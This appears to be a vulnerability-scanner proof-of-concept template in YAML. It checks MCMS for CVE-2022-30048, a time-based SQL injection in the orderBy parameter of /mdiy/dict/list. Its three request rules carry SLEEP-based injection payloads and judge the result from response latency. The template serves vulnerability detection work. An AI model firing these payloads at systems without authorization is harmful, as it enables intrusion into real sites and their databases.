name: poc-yaml-mcms-cve-2022-30048-sqli
binding: 47b3d583-032e-43b6-a953-965be861937d
manual: true
detail:
    author: 东晓南
    links:
        - https://toscode.gitee.com/mingSoft/MCMS/issues/I54VG0
        - http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202205-3000
    vulnerability:
        id: CT-431564
        level: critical
transport: http
set:
    sleepSecond: randomInt(5, 7)
    sleepSecond1: randomInt(2, 4)
    dictType: randomInt(1, 10)
    orderBy: randomInt(1, 10)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /mdiy/dict/list?dictType={{dictType}}&orderBy={{orderBy}}a;SELECT(SELECT(SLEEP(0)));
        expression: response.status == 200 && response.body_string.contains("SQLError")
        output:
            r0latency: response.latency
    r1:
        request:
            cache: true
            method: GET
            path: /mdiy/dict/list?dictType={{dictType}}&orderBy={{orderBy}})a;SELECT(SELECT(SLEEP({{sleepSecond}})));
        expression: response.latency - r0latency >= sleepSecond * 1000 - 500
    r2:
        request:
            cache: true
            method: GET
            path: /mdiy/dict/list?dictType={{dictType}}&orderBy={{orderBy}})a;SELECT(SELECT(SLEEP({{sleepSecond1}})));
        expression: response.latency - r0latency >= sleepSecond1 * 1000 - 500
expression: r0() && r1() && r2()
